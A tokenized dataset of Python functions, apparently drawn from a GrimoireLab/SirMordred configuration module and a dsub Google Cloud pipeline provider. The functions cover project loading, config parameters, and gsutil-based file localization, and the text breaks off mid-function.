def get repos by backend section ( cls , backend section , raw = True ) : repos = [ ] projects = Task Projects . get projects ( ) for pro in projects : if backend section in projects [ pro ] : # if the projects.json doesn't contain the `unknown` project, add the repos in the bck section if cls . GLOBAL PROJECT not in projects : repos += projects [ pro ] [ backend section ] else : # if the projects.json contains the `unknown` project # in the case of the collection phase if raw : # if the current project is not `unknown` if pro != cls . GLOBAL PROJECT : # if the bck section is not in the `unknown` project, add the repos in the bck section if backend section not in projects [ cls . GLOBAL PROJECT ] : repos += projects [ pro ] [ backend section ] # if the backend section is in the `unknown` project, # add the repo in the bck section under `unknown` elif backend section in projects [ pro ] and backend section in projects [ cls . GLOBAL PROJECT ] : repos += projects [ cls . GLOBAL PROJECT ] [ backend section ] # if the current project is `unknown` else : # if the backend section is only in the `unknown` project, # add the repo in the bck section under `unknown` not in unknown = [ projects [ pro ] for pro in projects if pro != cls . GLOBAL PROJECT ] [ 0 ] if backend section not in not in unknown : repos += projects [ cls . GLOBAL PROJECT ] [ backend section ] # in the case of the enrichment phase else : # if the current project is not `unknown` if pro != cls . GLOBAL PROJECT : # if the bck section is not in the `unknown` project, add the repos in the bck section if backend section not in projects [ cls . GLOBAL PROJECT ] : repos += projects [ pro ] [ backend section ] # if the backend section is in the `unknown` project, add the repos in the bck section elif backend section in projects [ pro ] and backend section in projects [ cls . GLOBAL PROJECT ] : repos += projects [ pro ] [ backend section ] # if the current project is `unknown` else : # if the backend section is only in the `unknown` project, # add the repo in the bck section under `unknown` not in unknown prj = [ projects [ prj ] for prj in projects if prj != cls . GLOBAL PROJECT ] not in unknown sections = list ( set ( [ section for prj in not in unknown prj for section in list ( prj . keys ( ) ) ] ) ) if backend section not in not in unknown sections : repos += projects [ pro ] [ backend section ] logger . debug ( "List of repos for %s: %s (raw=%s)" , backend section , repos , raw ) # avoid duplicated repos repos = list ( set ( repos ) ) return repos
def convert from eclipse ( self , eclipse projects ) : projects = { } # We need the global project for downloading the full Bugzilla and Gerrit projects [ 'unknown' ] = { "gerrit" : [ "git.eclipse.org" ] , "bugzilla" : [ "https://bugs.eclipse.org/bugs/" ] } projects = compose title ( projects , eclipse projects ) projects = compose projects json ( projects , eclipse projects ) return projects
def general params ( cls ) : params = { } # GENERAL CONFIG params general = { "general" : { "min update delay" : { "optional" : True , "default" : 60 , "type" : int , "description" : "Short delay between tasks (collect, enrich ...)" } , "update" : { "optional" : False , "default" : False , "type" : bool , "description" : "Execute the tasks in loop" } , "short name" : { "optional" : False , "default" : "Short name" , "type" : str , "description" : "Short name of the project" } , "debug" : { "optional" : False , "default" : True , "type" : bool , "description" : "Debug mode (logging mainly)" } , "logs dir" : { "optional" : False , "default" : "logs" , "type" : str , "description" : "Directory with the logs of sirmordred" } , "log handler" : { "optional" : True , "default" : "file" , "type" : str , "description" : "use rotate for rotating the logs automatically" } , "log max bytes" : { "optional" : True , "default" : 104857600 , # 100MB "type" : int , "description" : "Max number of bytes per log file" } , "log backup count" : { "optional" : True , "default" : 5 , "type" : int , "description" : "Number of rotate logs files to preserve" } , "bulk size" : { "optional" : True , "default" : 1000 , "type" : int , "description" : "Number of items to write in Elasticsearch using bulk operations" } , "scroll size" : { "optional" : True , "default" : 100 , "type" : int , "description" : "Number of items to read from Elasticsearch when scrolling" } , "aliases file" : { "optional" : True , "default" : ALIASES JSON , "type" : str , "description" : "JSON file to define aliases for raw and enriched indexes" } , "menu file" : { "optional" : True , "default" : MENU YAML , "type" : str , "description" : "YAML file to define the menus to be shown in Kibiter" } , "retention time" : { "optional" : True , "default" : None , "type" : int , "description" : "The maximum number of minutes wrt the current date to retain the data" } } } params projects = { "projects" : { "projects file" : { "optional" : True , "default" : PROJECTS JSON , "type" : str , "description" : "Projects file path with repositories to be collected group by projects" } , "projects url" : { "optional" : True , "default" : None , "type" : str , "description" : "Projects file URL" } , "load eclipse" : { "optional" : True , "default" : False , "type" : bool , "description" : "Load the projects from Eclipse" } } } params phases = { "phases" : { "collection" : { "optional" : False , "default" : True , "type" : bool , "description" : "Activate collection of items" } , "enrichment" : { "optional" : False , "default" : True , "type" : bool , "description" : "Activate enrichment of items" } , "identities" : { "optional" : False , "default" : True , "type" : bool , "description" : "Do the identities tasks" } , "panels" : { "optional" : False , "default" : True , "type" : bool , "description" : "Load panels, create alias and other tasks related" } , "track items" : { "optional" : True , "default" : False , "type" : bool , "description" : "Track specific items from a gerrit repository" } , "report" : { "optional" : True , "default" : False , "type" : bool , "description" : "Generate the PDF report for a project (alpha)" } } } general config params = [ params general , params projects , params phases ] for section params in general config params : params . update ( section params ) # Config provided by tasks params collection = { "es collection" : { "password" : { "optional" : True , "default" : None , "type" : str , "description" : "Password for connection to Elasticsearch" } , "user" : { "optional" : True , "default" : None , "type" : str , "description" : "User for connection to Elasticsearch" } , "url" : { "optional" : False , "default" : "http://172.17.0.1:9200" , "type" : str , "description" : "Elasticsearch URL" } , "arthur" : { "optional" : True , "default" : False , "type" : bool , "description" : "Use arthur for collecting items from perceval" } , "arthur url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL for the arthur service" } , "redis url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL for the redis service" } } } params enrichment = { "es enrichment" : { "url" : { "optional" : False , "default" : "http://172.17.0.1:9200" , "type" : str , "description" : "Elasticsearch URL" } , "autorefresh" : { "optional" : True , "default" : True , "type" : bool , "description" : "Execute the autorefresh of identities" } , "autorefresh interval" : { "optional" : True , "default" : 2 , "type" : int , "description" : "Set time interval (days) for autorefresh identities" } , "user" : { "optional" : True , "default" : None , "type" : str , "description" : "User for connection to Elasticsearch" } , "password" : { "optional" : True , "default" : None , "type" : str , "description" : "Password for connection to Elasticsearch" } } } params panels = { "panels" : { "strict" : { "optional" : True , "default" : True , "type" : bool , "description" : "Enable strict panels loading" } , "kibiter time from" : { "optional" : True , "default" : "now-90d" , "type" : str , "description" : "Default time interval for Kibiter" } , "kibiter default index" : { "optional" : True , "default" : "git" , "type" : str , "description" : "Default index pattern for Kibiter" } , "kibiter url" : { "optional" : False , "default" : None , "type" : str , "description" : "Kibiter URL" } , "kibiter version" : { "optional" : True , "default" : None , "type" : str , "description" : "Kibiter version" } , "community" : { "optional" : True , "default" : True , "type" : bool , "description" : "Enable community structure menu" } , "kafka" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable kafka menu" } , "github-repos" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable Git Hub repo stats menu" } , "gitlab-issues" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable Git Lab issues menu" } , "gitlab-merges" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable Git Lab merge requests menu" } , "mattermost" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable Mattermost menu" } } } params report = { "report" : { "start date" : { "optional" : False , "default" : "1970-01-01" , "type" : str , "description" : "Start date for the report" } , "end date" : { "optional" : False , "default" : "2100-01-01" , "type" : str , "description" : "End date for the report" } , "interval" : { "optional" : False , "default" : "quarter" , "type" : str , "description" : "Interval for the report" } , "config file" : { "optional" : False , "default" : "report.cfg" , "type" : str , "description" : "Config file for the report" } , "data dir" : { "optional" : False , "default" : "report data" , "type" : str , "description" : "Directory in which to store the report data" } , "filters" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "General filters to be applied to all queries" } , "offset" : { "optional" : True , "default" : None , "type" : str , "description" : "Date offset to be applied to start and end" } } } params sortinghat = { "sortinghat" : { "affiliate" : { "optional" : False , "default" : "True" , "type" : bool , "description" : "Affiliate identities to organizations" } , "unaffiliated group" : { "optional" : False , "default" : "Unknown" , "type" : str , "description" : "Name of the organization for unaffiliated identities" } , "matching" : { "optional" : False , "default" : [ "email" ] , "type" : list , "description" : "Algorithm for matching identities in Sortinghat" } , "sleep for" : { "optional" : False , "default" : 3600 , "type" : int , "description" : "Delay between task identities executions" } , "database" : { "optional" : False , "default" : "sortinghat db" , "type" : str , "description" : "Name of the Sortinghat database" } , "host" : { "optional" : False , "default" : "mariadb" , "type" : str , "description" : "Host with the Sortinghat database" } , "user" : { "optional" : False , "default" : "root" , "type" : str , "description" : "User to access the Sortinghat database" } , "password" : { "optional" : False , "default" : "" , "type" : str , "description" : "Password to access the Sortinghat database" } , "autoprofile" : { "optional" : False , "default" : [ "customer" , "git" , "github" ] , "type" : list , "description" : "Order in which to get the identities information for filling the profile" } , "load orgs" : { "optional" : True , "default" : False , "type" : bool , "deprecated" : "Load organizations in Sortinghat database" , "description" : "" } , "identities format" : { "optional" : True , "default" : "sortinghat" , "type" : str , "description" : "Format of the identities data to be loaded" } , "strict mapping" : { "optional" : True , "default" : True , "type" : bool , "description" : "rigorous check of values in identities matching " "(i.e, well formed email addresses)" } , "reset on load" : { "optional" : True , "default" : False , "type" : bool , "description" : "Unmerge and remove affiliations for all identities on load" } , "orgs file" : { "optional" : True , "default" : None , "type" : str , "description" : "File path with the organizations to be loaded in Sortinghat" } , "identities file" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "File path with the identities to be loaded in Sortinghat" } , "identities export url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL in which to export the identities in Sortinghat" } , "identities api token" : { "optional" : True , "default" : None , "type" : str , "description" : "API token for remote operation with Git Hub and Gitlab" } , "bots names" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "Name of the identities to be marked as bots" } , "no bots names" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "Name of the identities to be unmarked as bots" } , "autogender" : { "optional" : True , "default" : False , "type" : bool , "description" : "Add gender to the profiles (executes autogender)" } } } params track items = { "track items" : { "project" : { "optional" : False , "default" : "Track Project" , "type" : str , "description" : "Gerrit project to track" } , "upstream raw es url" : { "optional" : False , "default" : "" , "type" : str , "description" : "URL with the file with the gerrit reviews to track" } , "raw index gerrit" : { "optional" : False , "default" : "" , "type" : str , "description" : "Name of the gerrit raw index" } , "raw index git" : { "optional" : False , "default" : "" , "type" : str , "description" : "Name of the git raw index" } } } tasks config params = [ params collection , params enrichment , params panels , params report , params sortinghat , params track items ] for section params in tasks config params : params . update ( section params ) return params
def set param ( self , section , param , value ) : if section not in self . conf or param not in self . conf [ section ] : logger . error ( 'Config section %s and param %s not exists' , section , param ) else : self . conf [ section ] [ param ] = value
def execute nonstop tasks ( self , tasks cls ) : self . execute batch tasks ( tasks cls , self . conf [ 'sortinghat' ] [ 'sleep for' ] , self . conf [ 'general' ] [ 'min update delay' ] , False )
def execute initial load ( self ) : if self . conf [ 'phases' ] [ 'panels' ] : tasks cls = [ Task Panels , Task Panels Menu ] self . execute tasks ( tasks cls ) if self . conf [ 'phases' ] [ 'identities' ] : tasks cls = [ Task Init Sorting Hat ] self . execute tasks ( tasks cls ) logger . info ( "Loading projects" ) tasks cls = [ Task Projects ] self . execute tasks ( tasks cls ) logger . info ( "Done" ) return
def stdout ( self ) : if self . streaming : stdout = [ ] while not self . stdout . empty ( ) : try : line = self . stdout . get nowait ( ) stdout . append ( line ) except : pass else : stdout = self . stdout return stdout
def stderr ( self ) : if self . streaming : stderr = [ ] while not self . stderr . empty ( ) : try : line = self . stderr . get nowait ( ) stderr . append ( line ) except : pass else : stderr = self . stderr return stderr
def format ( self , record ) : if isinstance ( self . fmt , dict ) : self . fmt = self . fmt [ record . levelname ] if sys . version info > ( 3 , 2 ) : # Update self. style because we've changed self. fmt # (code based on stdlib's logging.Formatter. init ()) if self . style not in logging . STYLES : raise Value Error ( 'Style must be one of: %s' % ',' . join ( list ( logging . STYLES . keys ( ) ) ) ) self . style = logging . STYLES [ self . style ] [ 0 ] ( self . fmt ) if sys . version info > ( 2 , 7 ) : message = super ( Level Formatter , self ) . format ( record ) else : message = Colored Formatter . format ( self , record ) return message
def get storage service ( credentials ) : if credentials is None : credentials = oauth2client . client . Google Credentials . get application default ( ) return discovery . build ( 'storage' , 'v1' , credentials = credentials )
def retry storage check ( exception ) : now = datetime . now ( ) . strftime ( '%Y-%m-%d %H:%M:%S.%f' ) print error ( '%s: Exception %s: %s' % ( now , type ( exception ) . name , str ( exception ) ) ) return isinstance ( exception , oauth2client . client . Access Token Refresh Error )
def outputs are present ( outputs ) : # outputs are Output File Param (see param util.py) # If outputs contain a pattern, then there is no way for `dsub` to verify # that *all* output is present. The best that `dsub` can do is to verify # that *some* output was created for each such parameter. for o in outputs : if not o . value : continue if o . recursive : if not folder exists ( o . value ) : return False else : if not simple pattern exists in gcs ( o . value ) : return False return True
def build pipeline input file param ( cls , var name , docker path ) : # If the filename contains a wildcard, then the target Docker path must # be a directory in order to ensure consistency whether the source pattern # contains 1 or multiple files. # # In that case, we set the docker path to explicitly have a trailing slash # (for the Pipelines API "gsutil cp" handling, and then override the # associated var name environment variable in the generated Docker command. path , filename = os . path . split ( docker path ) if '*' in filename : return cls . build pipeline file param ( var name , path + '/' ) else : return cls . build pipeline file param ( var name , docker path )
def build pipeline docker command ( cls , script name , inputs , outputs , envs ) : # We upload the user script as an environment argument # and write it to SCRIPT DIR (preserving its local file name). # # The docker command: # * writes the script body to a file # * installs gcloud if there are recursive copies to do # * sets environment variables for inputs with wildcards # * sets environment variables for recursive input directories # * recursively copies input directories # * creates output directories # * sets environment variables for recursive output directories # * sets the DATA ROOT environment variable to /mnt/data # * sets the working directory to ${DATA ROOT} # * executes the user script # * recursively copies output directories recursive input dirs = [ var for var in inputs if var . recursive and var . value ] recursive output dirs = [ var for var in outputs if var . recursive and var . value ] install cloud sdk = '' if recursive input dirs or recursive output dirs : install cloud sdk = INSTALL CLOUD SDK export input dirs = '' copy input dirs = '' if recursive input dirs : export input dirs = providers util . build recursive localize env ( providers util . DATA MOUNT POINT , inputs ) copy input dirs = providers util . build recursive localize command ( providers util . DATA MOUNT POINT , inputs , job model . P GCS ) export output dirs = '' copy output dirs = '' if recursive output dirs : export output dirs = providers util . build recursive gcs delocalize env ( providers util . DATA MOUNT POINT , outputs ) copy output dirs = providers util . build recursive delocalize command ( providers util . DATA MOUNT POINT , outputs , job model . P GCS ) docker paths = [ var . docker path if var . recursive else os . path . dirname ( var . docker path ) for var in outputs if var . value ] mkdirs = '\n' . join ( [ 'mkdir -p {0}/{1}' . format ( providers util . DATA MOUNT POINT , path ) for path in docker paths ] ) inputs with wildcards = [ var for var in inputs if not var . recursive and var . docker path and '*' in os . path . basename ( var . docker path ) ] export inputs with wildcards = '\n' . join ( [ 'export {0}="{1}/{2}"' . format ( var . name , providers util . DATA MOUNT POINT , var . docker path ) for var in inputs with wildcards ] ) export empty envs = '\n' . join ( [ 'export {0}=""' . format ( var . name ) for var in envs | inputs | outputs if not var . value ] ) return DOCKER COMMAND . format ( mk runtime dirs = MK RUNTIME DIRS COMMAND , script path = '%s/%s' % ( providers util . SCRIPT DIR , script name ) , install cloud sdk = install cloud sdk , export inputs with wildcards = export inputs with wildcards , export input dirs = export input dirs , copy input dirs = copy input dirs , mk output dirs = mkdirs , export output dirs = export output dirs , export empty envs = export empty envs , tmpdir = providers util . TMP DIR , working dir = providers util . WORKING DIR , copy output dirs = copy output dirs )
def datetime to utc int ( date ) : if date is None : return None # Convert localized datetime to a UTC integer epoch = dsub util . replace timezone ( datetime . utcfromtimestamp ( 0 ) , pytz . utc ) return ( date - epoch ) . total seconds ( )
def prepare job metadata ( self , script , job name , user id , create time ) : return google base . prepare job metadata ( script , job name , user id , create time )
def build pipeline request ( self , task view ) : job metadata = task view . job metadata job params = task view . job params job resources = task view . job resources task metadata = task view . task descriptors [ 0 ] . task metadata task params = task view . task descriptors [ 0 ] . task params task resources = task view . task descriptors [ 0 ] . task resources script = task view . job metadata [ 'script' ] reserved labels = google base . build pipeline labels ( job metadata , task metadata , task id pattern = 'task-%d' ) # Build the ephemeral Pipeline for this job. # The ephemeral Pipeline definition changes for each job because file # parameters local Copy.path changes based on the remote uri. pipeline = Pipelines . build pipeline ( project = self . project , zones = job resources . zones , min cores = job resources . min cores , min ram = job resources . min ram , disk size = job resources . disk size , boot disk size = job resources . boot disk size , preemptible = job resources . preemptible , accelerator type = job resources . accelerator type , accelerator count = job resources . accelerator count , image = job resources . image , script name = script . name , envs = job params [ 'envs' ] | task params [ 'envs' ] , inputs = job params [ 'inputs' ] | task params [ 'inputs' ] , outputs = job params [ 'outputs' ] | task params [ 'outputs' ] , pipeline name = job metadata [ 'pipeline-name' ] ) # Build the pipeline Args for this job. logging uri = task resources . logging path . uri scopes = job resources . scopes or google base . DEFAULT SCOPES pipeline . update ( Pipelines . build pipeline args ( self . project , script . value , job params , task params , reserved labels , job resources . preemptible , logging uri , scopes , job resources . keep alive ) ) return pipeline
def convert suffix to docker chars ( suffix ) : # Docker container names must match: [a-z A-Z0-9][a-z A-Z0-9 .-] accepted characters = string . ascii letters + string . digits + ' .-' def label char transform ( char ) : if char in accepted characters : return char return '-' return '' . join ( label char transform ( c ) for c in suffix )
def task sort function ( task ) : return ( task . get field ( 'create-time' ) , int ( task . get field ( 'task-id' , 0 ) ) , int ( task . get field ( 'task-attempt' , 0 ) ) )
def datetime in range ( self , dt , dt min = None , dt max = None ) : # The pipelines API stores operation create-time with second granularity. # We mimic this behavior in the local provider by truncating to seconds. dt = dt . replace ( microsecond = 0 ) if dt min : dt min = dt min . replace ( microsecond = 0 ) else : dt min = dsub util . replace timezone ( datetime . datetime . min , pytz . utc ) if dt max : dt max = dt max . replace ( microsecond = 0 ) else : dt max = dsub util . replace timezone ( datetime . datetime . max , pytz . utc ) return dt min <= dt <= dt max
def get task from task dir ( self , job id , user id , task id , task attempt ) : # We need to be very careful about how we read and interpret the contents # of the task directory. The directory could be changing because a new # task is being created. The directory could be changing because a task # is ending. # # If the meta.yaml does not exist, the task does not yet exist. # If the meta.yaml exists, it means the task is scheduled. It does not mean # it is yet running. # If the task.pid file exists, it means that the runner.sh was started. task dir = self . task directory ( job id , task id , task attempt ) job descriptor = self . read task metadata ( task dir ) if not job descriptor : return None # If we read up an old task, the user-id will not be in the job descriptor. if not job descriptor . job metadata . get ( 'user-id' ) : job descriptor . job metadata [ 'user-id' ] = user id # Get the pid of the runner pid = - 1 try : with open ( os . path . join ( task dir , 'task.pid' ) , 'r' ) as f : pid = int ( f . readline ( ) . strip ( ) ) except ( IO Error , OS Error ) : pass # Get the script contents script = None script name = job descriptor . job metadata . get ( 'script-name' ) if script name : script = self . read script ( task dir , script name ) # Read the files written by the runner.sh. # For new tasks, these may not have been written yet. end time = self . get end time from task dir ( task dir ) last update = self . get last update time from task dir ( task dir ) events = self . get events from task dir ( task dir ) status = self . get status from task dir ( task dir ) log detail = self . get log detail from task dir ( task dir ) # If the status file is not yet written, then mark the task as pending if not status : status = 'RUNNING' log detail = [ 'Pending' ] return Local Task ( task status = status , events = events , log detail = log detail , job descriptor = job descriptor , end time = end time , last update = last update , pid = pid , script = script )
def task directory ( self , job id , task id , task attempt ) : dir name = 'task' if task id is None else str ( task id ) if task attempt : dir name = '%s.%s' % ( dir name , task attempt ) return self . provider root ( ) + '/' + job id + '/' + dir name
def make environment ( self , inputs , outputs , mounts ) : env = { } env . update ( providers util . get file environment variables ( inputs ) ) env . update ( providers util . get file environment variables ( outputs ) ) env . update ( providers util . get file environment variables ( mounts ) ) return env
def localize inputs recursive command ( self , task dir , inputs ) : data dir = os . path . join ( task dir , DATA SUBDIR ) provider commands = [ providers util . build recursive localize command ( data dir , inputs , file provider ) for file provider in SUPPORTED INPUT PROVIDERS ] return '\n' . join ( provider commands )
def localize inputs command ( self , task dir , inputs , user project ) : commands = [ ] for i in inputs : if i . recursive or not i . value : continue source file path = i . uri local file path = task dir + '/' + DATA SUBDIR + '/' + i . docker path dest file path = self . get input target path ( local file path ) commands . append ( 'mkdir -p "%s"' % os . path . dirname ( local file path ) ) if i . file provider in [ job model . P LOCAL , job model . P GCS ] : # The semantics that we expect here are implemented consistently in # "gsutil cp", and are a bit different than "cp" when it comes to # wildcard handling, so use it for both local and GCS: # # - `cp path/* dest/` will error if "path" has subdirectories. # - `cp "path/*" "dest/"` will fail (it expects wildcard expansion #   to come from shell). if user project : command = 'gsutil -u %s -mq cp "%s" "%s"' % ( user project , source file path , dest file path ) else : command = 'gsutil -mq cp "%s" "%s"' % ( source file path , dest file path ) commands . append ( command ) return '\n' . join ( commands )
def delocalize outputs commands ( self , task dir , outputs , user project ) : commands = [ ] for o in outputs : if o . recursive or not o . value : continue # The destination path is o.uri.path, which is the target directory # (rather than o.uri, which includes the filename or wildcard). dest path = o . uri . path local path = task dir + '/' + DATA SUBDIR + '/' + o . docker path if o . file provider == job model . P LOCAL : commands . append ( 'mkdir -p "%s"' % dest path ) # Use gsutil even for local files (explained in  localize inputs command). if o . file provider in [ job model . P LOCAL , job model . P GCS ] : if user project : command = 'gsutil -u %s -mq cp "%s" "%s"' % ( user project , local path , dest path ) else : command = 'gsutil -mq cp "%s" "%s"' % ( local path , dest path ) commands . append ( command ) return '\n' . join ( commands )
def map ( self , event ) : description = event . get ( 'description' , '' ) start time = google base . parse rfc3339 utc string ( event . get ( 'timestamp' , '' ) ) for name , regex in EVENT REGEX MAP . items ( ) : match = regex . match ( description ) if match : return { 'name' : name , 'start-time' : start time } , match return { 'name' : description , 'start-time' : start time } , None
def get logging env ( self , logging uri , user project ) : if not logging uri . endswith ( '.log' ) : raise Value Error ( 'Logging URI must end in ".log": {}' . format ( logging uri ) ) logging prefix = logging uri [ : - len ( '.log' ) ] return { 'LOGGING PATH' : '{}.log' . format ( logging prefix ) , 'STDOUT PATH' : '{}-stdout.log' . format ( logging prefix ) , 'STDERR PATH' : '{}-stderr.log' . format ( logging prefix ) , 'USER PROJECT' : user project , }
def get prepare env ( self , script , job descriptor , inputs , outputs , mounts ) : # Add the  SCRIPT REPR with the repr(script) contents # Add the  META YAML REPR with the repr(meta) contents # Add variables for directories that need to be created, for example: # DIR COUNT: 2 # DIR 0: /mnt/data/input/gs/bucket/path1/ # DIR 1: /mnt/data/output/gs/bucket/path2 # List the directories in sorted order so that they are created in that # order. This is primarily to ensure that permissions are set as we create # each directory. # For example: #   mkdir -m 777 -p /root/first/second #   mkdir -m 777 -p /root/first # *may* not actually set 777 on /root/first docker paths = sorted ( [ var . docker path if var . recursive else os . path . dirname ( var . docker path ) for var in inputs | outputs | mounts if var . value ] ) env = { SCRIPT VARNAME : repr ( script . value ) , META YAML VARNAME : repr ( job descriptor . to yaml ( ) ) , 'DIR COUNT' : str ( len ( docker paths ) ) } for idx , path in enumerate ( docker paths ) : env [ 'DIR {}' . format ( idx ) ] = os . path . join ( providers util . DATA MOUNT POINT , path ) return env
def get localization env ( self , inputs , user project ) : # Add variables for paths that need to be localized, for example: # INPUT COUNT: 1 # INPUT 0: MY INPUT FILE # INPUT RECURSIVE 0: 0 # INPUT SRC 0: gs://mybucket/mypath/myfile # INPUT DST 0: /mnt/data/inputs/mybucket/mypath/myfile non empty inputs = [ var for var in inputs if var . value ] env = { 'INPUT COUNT' : str ( len ( non empty inputs ) ) } for idx , var in enumerate ( non empty inputs ) : env [ 'INPUT {}' . format ( idx ) ] = var . name env [ 'INPUT RECURSIVE {}' . format ( idx ) ] = str ( int ( var . recursive ) ) env [ 'INPUT SRC {}' . format ( idx ) ] = var . value # For wildcard paths, the destination must be a directory dst = os . path . join ( providers util . DATA MOUNT POINT , var . docker path ) path , filename = os . path . split ( dst ) if '*' in filename : dst = '{}/' . format ( path ) env [ 'INPUT DST {}' . format ( idx ) ] = dst env [ 'USER PROJECT' ] = user project return env
def get delocalization env ( self , outputs , user project ) : # Add variables for paths that need to be delocalized, for example: # OUTPUT COUNT: 1 # OUTPUT 0: MY OUTPUT FILE # OUTPUT RECURSIVE 0: 0 # OUTPUT SRC 0: gs://mybucket/mypath/myfile # OUTPUT DST 0: /mnt/data/outputs/mybucket/mypath/myfile non empty outputs = [ var for var in outputs if var . value ] env = { 'OUTPUT COUNT' : str ( len ( non empty outputs ) ) } for idx , var in enumerate ( non empty outputs ) : env [ 'OUTPUT {}' . format ( idx ) ] = var . name env [ 'OUTPUT RECURSIVE {}' . format ( idx ) ] = str ( int ( var . recursive ) ) env [ 'OUTPUT SRC {}' . format ( idx ) ] = os . path . join ( providers util . DATA MOUNT POINT , var . docker path ) # For wildcard paths, the destination must be a directory if '*' in var . uri . basename : dst = var . uri . path else : dst = var . uri env [ 'OUTPUT DST {}' . format ( idx ) ] = dst env [ 'USER PROJECT' ] = user project return env
def build user environment ( self , envs , inputs , outputs , mounts ) : envs = { env . name : env . value for env in envs } envs . update ( providers util . get file environment variables ( inputs ) ) envs . update ( providers util . get file environment variables ( outputs ) ) envs . update ( providers util . get file environment variables ( mounts ) ) return envs
def get mount actions ( self , mounts , mnt datadisk ) : actions to add = [ ] for mount in mounts : bucket = mount . value [ len ( 'gs://' ) : ] mount path = mount . docker path actions to add . extend ( [ google v2 pipelines . build action ( name = 'mount-{}' . format ( bucket ) , flags = [ 'ENABLE FUSE' , 'RUN IN BACKGROUND' ] , image uri = GCSFUSE IMAGE , mounts = [ mnt datadisk ] , commands = [ '--implicit-dirs' , '--foreground' , '-o ro' , bucket , os . path . join ( providers util . DATA MOUNT POINT , mount path ) ] ) , google v2 pipelines . build action ( name = 'mount-wait-{}' . format ( bucket ) , flags = [ 'ENABLE FUSE' ] , image uri = GCSFUSE IMAGE , mounts = [ mnt datadisk ] , commands = [ 'wait' , os . path . join ( providers util . DATA MOUNT POINT , mount path ) ] ) ] ) return actions to add
def build pipeline request ( self , task view ) : job metadata = task view . job metadata job params = task view . job params job resources = task view . job resources task metadata = task view . task descriptors [ 0 ] . task metadata task params = task view . task descriptors [ 0 ] . task params task resources = task view . task descriptors [ 0 ] . task resources # Set up VM-specific variables mnt datadisk = google v2 pipelines . build mount ( disk = DATA DISK NAME , path = providers util . DATA MOUNT POINT , read only = False ) scopes = job resources . scopes or google base . DEFAULT SCOPES # Set up the task labels labels = { label . name : label . value if label . value else '' for label in google base . build pipeline labels ( job metadata , task metadata ) | job params [ 'labels' ] | task params [ 'labels' ] } # Set local variables for the core pipeline values script = task view . job metadata [ 'script' ] user project = task view . job metadata [ 'user-project' ] or '' envs = job params [ 'envs' ] | task params [ 'envs' ] inputs = job params [ 'inputs' ] | task params [ 'inputs' ] outputs = job params [ 'outputs' ] | task params [ 'outputs' ] mounts = job params [ 'mounts' ] gcs mounts = param util . get gcs mounts ( mounts ) persistent disk mount params = param util . get persistent disk mounts ( mounts ) persistent disks = [ google v2 pipelines . build disk ( name = disk . name . replace ( ' ' , '-' ) , # Underscores not allowed size gb = disk . disk size or job model . DEFAULT MOUNTED DISK SIZE , source image = disk . value , disk type = disk . disk type or job model . DEFAULT DISK TYPE ) for disk in persistent disk mount params ] persistent disk mounts = [ google v2 pipelines . build mount ( disk = persistent disk . get ( 'name' ) , path = os . path . join ( providers util . DATA MOUNT POINT , persistent disk mount param . docker path ) , read only = True ) for persistent disk , persistent disk mount param in zip ( persistent disks , persistent disk mount params ) ] # The list of "actions" (1-based) will be: #   1- continuous copy of log files off to Cloud Storage #   2- prepare the shared mount point (write the user script) #   3- localize objects from Cloud Storage to block storage #   4- execute user command #   5- delocalize objects from block storage to Cloud Storage #   6- final copy of log files off to Cloud Storage # # If the user has requested an SSH server be started, it will be inserted # after logging is started, and all subsequent action numbers above will be # incremented by 1. # If the user has requested to mount one or more buckets, two actions per # bucket will be inserted after the prepare step, and all subsequent action # numbers will be incremented by the number of actions added. # # We need to track the action numbers specifically for the user action and # the final logging action. optional actions = 0 if job resources . ssh : optional actions += 1 mount actions = self . get mount actions ( gcs mounts , mnt datadisk ) optional actions += len ( mount actions ) user action = 4 + optional actions final logging action = 6 + optional actions # Set up the commands and environment for the logging actions logging cmd = LOGGING CMD . format ( log cp fn = GSUTIL CP FN , log cp cmd = LOG CP CMD . format ( user action = user action , logging action = 'logging action' ) ) continuous logging cmd = CONTINUOUS LOGGING CMD . format ( log msg fn = LOG MSG FN , log cp fn = GSUTIL CP FN , log cp cmd = LOG CP CMD . format ( user action = user action , logging action = 'continuous logging action' ) , final logging action = final logging action , log interval = job resources . log interval or '60s' ) logging env = self . get logging env ( task resources . logging path . uri , user project ) # Set up command and environments for the prepare, localization, user, # and de-localization actions script path = os . path . join ( providers util . SCRIPT DIR , script . name ) prepare command = PREPARE CMD . format ( log msg fn = LOG MSG FN , mk runtime dirs = MK RUNTIME DIRS CMD , script var = SCRIPT VARNAME , python decode script = PYTHON DECODE SCRIPT , script path = script path , mk io dirs = MK IO DIRS ) prepare env = self . get prepare env ( script , task view , inputs , outputs , mounts ) localization env = self . get localization env ( inputs , user project ) user environment = self . build user environment ( envs , inputs , outputs , mounts ) delocalization env = self . get delocalization env ( outputs , user project ) # Build the list of actions actions = [ ] actions . append ( google v2 pipelines . build action ( name = 'logging' , flags = 'RUN IN BACKGROUND' , image uri = CLOUD SDK IMAGE , environment = logging env , entrypoint = '/bin/bash' , commands = [ '-c' , continuous logging cmd ] ) ) if job resources . ssh : actions . append ( google v2 pipelines . build action ( name = 'ssh' , image uri = SSH IMAGE , mounts = [ mnt datadisk ] , entrypoint = 'ssh-server' , port mappings = { DEFAULT SSH PORT : DEFAULT SSH PORT } , flags = 'RUN IN BACKGROUND' ) ) actions . append ( google v2 pipelines . build action ( name = 'prepare' , image uri = PYTHON IMAGE , mounts = [ mnt datadisk ] , environment = prepare env , entrypoint = '/bin/bash' , commands = [ '-c' , prepare command ] ) , ) actions . extend ( mount actions ) actions . extend ( [ google v2 pipelines . build action ( name = 'localization' , image uri = CLOUD SDK IMAGE , mounts = [ mnt datadisk ] , environment = localization env , entrypoint = '/bin/bash' , commands = [ '-c' , LOCALIZATION CMD . format ( log msg fn = LOG MSG FN , recursive cp fn = GSUTIL RSYNC FN , cp fn = GSUTIL CP FN , cp loop = LOCALIZATION LOOP ) ] ) , google v2 pipelines . build action ( name = 'user-command' , image uri = 